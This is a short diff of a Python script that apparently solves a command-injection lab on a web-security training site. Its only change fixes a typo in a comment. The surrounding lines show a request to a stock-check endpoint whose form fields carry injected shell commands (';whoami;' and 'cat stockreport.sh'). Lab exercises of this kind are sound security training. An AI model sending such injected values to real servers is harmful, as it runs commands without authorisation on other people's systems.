@@ -17,7 +17,7 @@ import requests
 lab_id = '0ab500c6046626e18322661f005a0055' #change based on generated lab
 uri = f"https://{lab_id}.web-security-academy.net/product/stock"  # target the stock endpoint
 
-# inject into the paramaters the commands we want to run
+# inject into the parameters the commands we want to run
 data =  { 'productId' : ' ;whoami;',
          'storeId' : 'cat stockreport.sh'}
 
